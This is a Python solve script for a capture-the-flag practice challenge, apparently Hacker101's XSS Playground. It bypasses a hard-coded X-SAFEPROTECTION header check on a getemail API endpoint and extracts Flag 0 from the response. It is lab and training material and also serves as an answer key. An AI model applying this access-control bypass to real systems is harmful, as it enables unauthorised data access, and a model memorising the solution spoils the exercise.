#!/usr/bin/env python3
"""
PoC: XSS Playground by zseano (HackerOne CTF)

Captures Flag 0 by exploiting the case-sensitive X-SAFEPROTECTION header
on the /api/action.php?act=getemail endpoint.

Usage: python3 solve.py <ctf_base_url>

Note: HTTP/2 normalizes headers to lowercase, so this challenge requires
      a transport that preserves header casing (HTTP/1.1). The requests
      library handles this when the header name is passed with correct case.
"""

import sys
import re
import requests


def get_cookies_from_api(session, base_url, endpoint, data=None):
    """Post to an API action to establish session cookies."""
    try:
        r = session.post(f"{base_url}/{endpoint}", data=data or {})
        return r.cookies
    except Exception as e:
        print(f"[-] Failed to get cookies from {endpoint}: {e}")
        return None


def flag0_getemail(base_url, session):
    """
    Flag 0 — Case-Sensitive Security Header Bypass

    The /api/action.php?act=getemail endpoint requires a header:
        X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U=

    The value 'enNlYW5vb2Zjb3Vyc2U=' is base64 for 'zseanoofcourse'.
    HTTP/2 lowercases headers, so HTTP/1.1 must be used to preserve casing.
    Python's requests library handles this correctly.
    """
    headers = {
        "X-SAFEPROTECTION": "enNlYW5vb2Zjb3Vyc2U=",
    }

    try:
        r = session.get(
            f"{base_url}/api/action.php?act=getemail",
            headers=headers,
        )
        return r.text
    except Exception as e:
        print(f"[-] Flag 0 request failed: {e}")
        return None


def extract_flag(text):
    """Extract flag hex from a response string."""
    # Match ^FLAG^<hex>$  or ^FLAG^<hex>$FLAG$
    match = re.search(r"\^FLAG\^([a-f0-9]+)\$", text, re.IGNORECASE)
    if match:
        return match.group(1)
    return None


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <ctf_base_url>")
        print(f"Example: {sys.argv[0]} https://abc123.ctf.hacker101.com/")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")

    print(f"[*] Target: {base_url}")
    print()

    # Use a session to maintain cookies across requests
    session = requests.Session()
    session.headers.update({"User-Agent": "solve.py - HackerOne CTF PoC"})

    # --- Flag 0: Case-Sensitive Security Header Bypass ---
    print("[*] Flag 0 — Case-Sensitive Security Header Bypass")
    print("    Endpoint: /api/action.php?act=getemail")
    print("    Header:   X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U=")
    print("    Trick:    HTTP/2 lowercases headers; HTTP/1.1 preserves case.")

    resp = flag0_getemail(base_url, session)

    if resp:
        flag = extract_flag(resp)
        if flag:
            print(f"    [+] Flag 0: {flag}")
        else:
            print(f"    [!] Response received but no flag found:")
            print(f"        {resp[:200]}")
    else:
        print("    [-] No response received.")

    print()

    # --- Summary ---
    print("[*] Done.")


if __name__ == "__main__":
    main()
